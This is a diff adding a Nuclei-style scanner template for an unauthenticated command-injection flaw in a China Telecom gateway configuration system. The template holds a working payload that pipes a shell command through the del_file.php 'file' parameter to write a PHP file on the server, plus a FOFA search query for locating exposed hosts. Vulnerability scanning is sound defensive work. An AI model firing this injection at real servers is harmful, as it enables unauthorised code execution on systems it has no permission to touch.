@@ -1,0 +1,32 @@
+id: china_telecom_gateway_del_file_rce
+info:
+  name: 电信网关配置管理系统 del_file.php 前台RCE漏洞
+  author: fgz
+  severity: critical
+  description: '电信网关配置管理系统是由中国电信集团有限公司提供的一款专门用于管理和配置电信网络中网关设备的软件。该系统可以帮助网络管理员进行远程监控、配置、升级和故障排除。该系统中的 /manager/newtpl/del_file.php接口存在一个命令执行漏洞。未经身份验证的远程攻击者可以利用此漏洞执行任意代码，从而导致服务器失陷。'
+  tags: 2024,rce
+  metadata:
+    max-request: 1
+    fofa-query: body="img/login_bg3.png" && body="系统登录"
+    verified: true
+variables:
+  filename: "{{to_lower(rand_base(8))}}"
+  bodystr: "{{to_lower(rand_base(15))}}"
+http:
+  - raw:
+      - |
+        GET /manager/newtpl/del_file.php?file=1.txt|echo%20{{bodystr}}%20%3E%20{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+        Connection: close
+      - |
+        GET /manager/newtpl/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{bodystr}}')"
